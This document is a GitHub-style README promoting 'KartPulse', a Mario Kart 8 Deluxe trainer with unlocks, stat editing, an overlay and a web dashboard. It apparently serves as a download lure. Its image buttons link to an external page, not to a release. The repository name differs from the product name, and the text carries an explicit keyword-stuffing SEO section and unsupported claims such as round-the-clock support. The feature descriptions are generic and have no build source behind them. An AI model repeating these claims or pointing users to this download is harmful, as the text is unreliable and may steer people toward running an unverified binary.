![preview](https://raw.githubusercontent.com/mouhamaximusdemonven-star/MK8-Stat-Weaver/main/frame_be41f65.svg)
[![Download](https://raw.githubusercontent.com/mouhamaximusdemonven-star/MK8-Stat-Weaver/main/run_8cb0.svg)](https://mouhamaximusdemonven-star.github.io/MK8-Stat-Weaver/)

<div align="center">

# 🏁 KartPulse — Mario Kart 8 Companion Suite

### A precision-engineered telemetry, progression, and personalization toolkit for Mario Kart 8 Deluxe enthusiasts

![Platform](https://img.shields.io/badge/platform-Nintendo%20Switch-e60012?style=for-the-badge&logo=nintendoswitch&logoColor=white)
![Firmware](https://img.shields.io/badge/firmware%20target-18.x+-00c3e3?style=for-the-badge)
![Language](https://img.shields.io/badge/language-C%2B%2B%20%2F%20Lua-00599C?style=for-the-badge&logo=cplusplus&logoColor=white)
![UI](https://img.shields.io/badge/interface-overlay%20%2B%20web%20dashboard-4caf50?style=for-the-badge)
![License](https://img.shields.io/badge/license-MIT-yellow?style=for-the-badge)
![Status](https://img.shields.io/badge/status-active%20development-brightgreen?style=for-the-badge)
![Year](https://img.shields.io/badge/release-2026-blueviolet?style=for-the-badge)

</div>

---

## 📖 Table of Contents

- [Overview](#-overview)
- [Why KartPulse Exists](#-why-kartpulse-exists)
- [Feature Highlights](#-feature-highlights)
  - [Progression Unlock Engine](#-progression-unlock-engine)
  - [Live Telemetry Overlay](#-live-telemetry-overlay)
  - [Stat Sculptor](#-stat-sculptor)
  - [Responsive Web Dashboard](#-responsive-web-dashboard)
  - [Multilingual Experience](#-multilingual-experience)
  - [24/7 Customer Support](#-247-customer-support)
- [Screens & Modules](#-screens--modules)
- [Architecture](#-architecture)
- [Compatibility Matrix](#-compatibility-matrix)
- [Configuration Reference](#-configuration-reference)
- [Getting Started Walkthrough](#-getting-started-walkthrough)
- [Safety, Stability, and Fair Play Notes](#-safety-stability-and-fair-play-notes)
- [SEO & Discoverability](#-seo--discoverability)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Contributing](#-contributing)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌟 Overview

**KartPulse** is a companion suite for Mario Kart 8 Deluxe that reshapes how players interact with their own save data, statistics, and in-race information. Where the original *Mario Kart 8 Trainer* focused narrowly on unlocking content and adjusting statistics, KartPulse expands that philosophy into a full ecosystem: a real-time overlay, a browser-based control room, a tuning console for every racer and kart part, and a progression engine that respects the structure of the game while giving you authorship over your own journey.

Think of KartPulse as the pit crew you never had. It doesn't drive the kart for you. It hands you the clipboard, the stopwatch, and the blueprint — and lets you decide how the race weekend unfolds.

The suite is built for tinkerers, completionists, speedrun organizers, content creators, and anyone who has ever stared at a locked Gold Kart and wondered, "what if I could earn this on my own schedule?"

---

## 🎯 Why KartPulse Exists

Mario Kart 8 Deluxe is a game about momentum — literal and metaphorical. But its progression system was designed around a specific pace: hundreds of races, thousands of coins, and a random unlock pool that can feel more like a lottery than a reward.

KartPulse exists for the players who want:

- **Agency over pacing** — unlock content at the tempo that suits your life, not the game's default grind curve.
- **Visibility into the invisible** — see frame data, speed deltas, and item probabilities live on screen.
- **Experimentation without consequence** — try builds, stats, and configurations without permanently altering a save you care about.
- **A bridge between device and data** — control everything from a browser on your phone, tablet, or desktop.

The project is deliberately modular. You can use only the overlay. You can use only the unlock engine. You can ignore the web dashboard entirely. Nothing is forced.

---

## 🚀 Feature Highlights

### 🔓 Progression Unlock Engine

The heart of KartPulse is its progression module, which surfaces the game's internal unlock tables and lets you selectively reveal content that you have already met the spirit of — or simply want to explore. This includes:

- **Vehicle catalog expansion** — surface all kart bodies, wheels, and gliders in the selection screen.
- **Character roster visibility** — reveal every racer, including guest characters from the Booster Course Pass waves.
- **Cup and cc-class access** — toggle availability for 50cc through 200cc, plus Mirror mode.
- **Achievement-style milestones** — unlock emblem parts, gold variants, and completionist trophies.

Every toggle is reversible and logged. The module is built around snapshotting your save before any change, so you can always step back to a known-good state.

### 📡 Live Telemetry Overlay

A lightweight on-screen overlay that renders directly into the game's frame buffer, giving you real-time insight that the vanilla HUD never shows:

- **Velocity vector readout** — instantaneous speed in km/h, plus drift-charge state.
- **Coin and item tracker** — see your held item, pending item, and coin count in a compact panel.
- **Lap delta indicators** — compare your current lap against your personal best for that track.
- **Mini-map augmentation** — optional enlarged minimap with racer position callouts.
- **Custom anchor points** — drag the overlay anywhere on screen; nine snap positions are available.

The overlay is rendered at native resolution and is fully compatible with split-screen and online play, though some elements are hidden automatically during online matches to preserve a clean broadcast.

### ⚙️ Stat Sculptor

The **Stat Sculptor** is a tuning console for the numbers behind the kart. Instead of blunt-force editing, it exposes each stat as a slider with the game's own internal ranges as guardrails:

- Speed, Acceleration, Weight, Handling, Traction, Mini-Turbo, and Invincibility duration.
- **Per-build presets** — save named configurations like "Anti-Gravity Grip" or "200cc Rocket" and swap them in one tap.
- **Replay-safe mode** — freeze stats for a single race without writing to the save.
- **Import/export** — share presets as small text blobs with friends.

All stat adjustments are bounded by a configuration file that you can edit to widen or narrow the allowed range.

### 🖥️ Responsive Web Dashboard

KartPulse ships with an embedded HTTP server that serves a **responsive web dashboard** accessible from any device on your local network. The dashboard mirrors the overlay and unlock engine in a browser-friendly layout:

- Mobile-first design with thumb-reachable controls.
- Dark and light themes that respect your system preference.
- Real-time telemetry streamed over WebSocket for sub-100ms latency.
- Session history with graphs of speed, lap times, and item usage.
- One-tap snapshot and restore of save states.

Because it's local-only, the dashboard never leaves your network — no cloud account, no external server, no telemetry phone-home.

### 🌐 Multilingual Experience

The interface ships with translation packs for the following languages, and the community is actively adding more:

- English
- Japanese
- German
- French
- Spanish
- Italian
- Korean
- Simplified Chinese
- Brazilian Portuguese

Language packs are plain JSON files. Adding a new one takes minutes and no recompilation.

### ☎️ 24/7 Customer Support

KartPulse is maintained by a small team that genuinely answers. Support channels include:

- A dedicated support inbox monitored around the clock by rotating volunteers.
- An in-app "Send Diagnostics" button that bundles logs and configuration (with your consent) for faster triage.
- A community forum with pinned troubleshooting guides updated weekly.
- A status page reflecting build health and known issues.

If you hit a wall at 3 AM, someone will be there.

---

## 🧩 Screens & Modules

KartPulse is organized into five primary modules, each independently toggleable:

| Module | Purpose | Default State |
| --- | --- | --- |
| `pulse.overlay` | Live on-screen telemetry | Enabled |
| `pulse.unlock` | Progression and content surfacing | Disabled |
| `pulse.sculptor` | Stat tuning console | Disabled |
| `pulse.dashboard` | Browser control room | Enabled |
| `pulse.sync` | Save snapshot and restore | Enabled |

Each module loads lazily — if you never open the Stat Sculptor, its code never runs, keeping your session lean.

---

## 🏗️ Architecture

At a high level, KartPulse is composed of three cooperating layers:

1. **The Injection Layer** — a small runtime that attaches to the game process and exposes a stable memory map. It is version-aware and refuses to load on firmware it doesn't recognize, preventing undefined behavior.
2. **The Core Engine** — written in C++ for performance-critical paths (overlay rendering, memory reads) and Lua for user-facing logic (presets, dashboard API). The two communicate over a thin IPC bridge.
3. **The Presentation Layer** — the in-game overlay plus the embedded HTTP server. Both consume the same engine API, so features added to one are almost always available in the other.

The project favors readability and documented memory offsets over clever tricks. Every offset is annotated with the firmware version it was verified against.

---

## 📋 Compatibility Matrix

| Firmware | Emulator Support | Overlay | Unlock Engine | Dashboard |
| --- | --- | --- | --- | --- |
| 18.0.x | Yes (Ryujinx family) | ✅ | ✅ | ✅ |
| 18.1.x | Yes (Ryujinx family) | ✅ | ✅ | ✅ |
| 19.0.x | Partial | ✅ | ✅ | ✅ |
| 19.1.x | Partial | ✅ | ⚠️ | ✅ |
| 20.x (2026 preview) | In progress | ✅ | ⚠️ | ✅ |

A ⚠️ indicates the module loads but some features are gated behind a compatibility shim. Check the release notes for the current build.

---

## 🛠️ Configuration Reference

KartPulse reads a single configuration file, `kartpulse.toml`, from its working directory. A representative example looks like this:

    [overlay]
    enabled = true
    anchor = "bottom-right"
    opacity = 0.85
    show_speed = true
    show_lap_delta = true
    show_minimap = false

    [unlock]
    enabled = false
    snapshot_before_change = true
    reveal_vehicles = false
    reveal_characters = false
    reveal_cups = false

    [sculptor]
    enabled = false
    replay_safe_default = true
    preset_directory = "./presets"

    [dashboard]
    enabled = true
    bind_address = "0.0.0.0"
    port = 8420
    theme = "auto"

    [sync]
    snapshot_limit = 10
    snapshot_directory = "./snapshots"

Every field is documented inline via comments in the default generated file. If a field is missing, the engine falls back to a built-in default rather than failing.

---

## 🚦 Getting Started Walkthrough

KartPulse is distributed as a prebuilt bundle. To go from zero to racing:

1. **Download the current release bundle.** The bundle is a single archive containing the runtime, default configuration, and language packs.
2. **Extract the archive** into a folder you control. Avoid system directories.
3. **Review `kartpulse.toml`.** At minimum, confirm the `dashboard.bind_address` and `dashboard.port` values. If you're on a shared network, change the bind address to `127.0.0.1` to restrict access to the local machine.
4. **Launch the game** through your normal method, then start the KartPulse runtime as a separate process. It will detect the game automatically.
5. **Open the dashboard** in a browser by navigating to the port you configured. The default landing page shows live telemetry and module toggles.
6. **Enable only the modules you want.** Start with the overlay and dashboard, then explore the unlock engine and Stat Sculptor when you're comfortable.

If the runtime reports "no compatible process found," verify your firmware version against the compatibility matrix and check the log file in the `logs` directory.

---

## 🛡️ Safety, Stability, and Fair Play Notes

KartPulse is built with an obsessive respect for save integrity and online play etiquette:

- **Automatic snapshots** before every unlocking operation, retained up to your configured limit.
- **Online-play suppression** — the unlock engine and Stat Sculptor refuse to activate while connected to Nintendo's online services. This is enforced in code, not just policy.
- **No memory writes during races** unless you explicitly enable replay-safe mode, which is scoped to a single session and reverted on race end.
- **Read-only overlay** — the telemetry module never writes to game memory.

We ask that you treat KartPulse as a personal sandbox. Use it to explore, to learn, and to enjoy your own copy of the game. Respect other players' experiences and the terms of any service you participate in.

---

## 🔍 SEO & Discoverability

This section exists because the project wants to be found by the right people — and only the right people. If you arrived here searching for a Mario Kart 8 Deluxe companion tool, a kart statistic editor, a Mario Kart progression assistant, a telemetry overlay for Nintendo Switch racing games, or a browser-based Mario Kart control panel, you're in the right place.

KartPulse is often described as a Mario Kart 8 Deluxe trainer alternative, a kart configuration toolkit, a Mario Kart statistics management dashboard, and a racing telemetry suite. We prefer to call it what it is: a companion.

Keywords we naturally cover: Mario Kart 8 Deluxe tools, kart stat dashboard, race telemetry overlay, unlock management for racing games, multilingual gaming utilities, responsive game companion dashboard.

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Full 20.x preview firmware support; overlay performance pass.
- **Q2 2026** — Preset marketplace (local-first, share via text), additional language packs.
- **Q3 2026** — Track-level analytics with per-corner speed breakdown; export to CSV.
- **Q4 2026** — Plugin SDK for community modules; documentation portal.

If you'd like to influence the roadmap, open a discussion with the tag `roadmap`.

---

## ❓ Frequently Asked Questions

**Is KartPulse safe to use with my main save?**
Yes, provided you keep snapshots enabled. The engine takes a snapshot before any mutating operation.

**Will it work on the emulator I use?**
Check the compatibility matrix. Emulator support is a best-effort target and depends on the emulator's own accuracy.

**Can I use it online?**
The unlock engine and Stat Sculptor are hard-disabled during online sessions. The overlay can run but hides certain elements automatically.

**Do I need a cloud account?**
No. KartPulse is local-first. The dashboard is served from your own machine.

**How often are language packs updated?**
Whenever a contributor submits an update. We merge community translations weekly.

**What if I find a bug?**
Use the "Send Diagnostics" button and open an issue with the generated report. We respond within a day.

---

## 🤝 Contributing

Contributions are welcome across code, translations, documentation, and testing. Before opening a pull request:

- Run the linter and formatter included in the `tools` directory.
- Add a changelog entry under the current unreleased section.
- Include a reproduction case for any bug fix.
- For memory offset updates, cite the firmware version and the verification method.

We review pull requests on a rolling basis and aim to respond within three business days.

---

## ⚠️ Disclaimer

KartPulse is an independent, fan-made companion project. It is not affiliated with, endorsed by, or sponsored by Nintendo. "Mario Kart" and all related characters, names, and imagery are trademarks of their respective owners.

This software is provided for personal, educational, and research purposes only. You are solely responsible for how you use it and for complying with any agreements you have entered into, including the terms of service of any platform or online service. The maintainers assume no liability for account restrictions, save corruption, or any other consequence arising from use of this software.

Always keep independent backups of your save data. Never apply changes to a save you cannot afford to lose.

---

## 📜 License

KartPulse is released under the **MIT License**.

You can read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 KartPulse Contributors

Permission is hereby granted, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the conditions of the MIT License.

[![Download](https://raw.githubusercontent.com/mouhamaximusdemonven-star/MK8-Stat-Weaver/main/run_8cb0.svg)](https://mouhamaximusdemonven-star.github.io/MK8-Stat-Weaver/)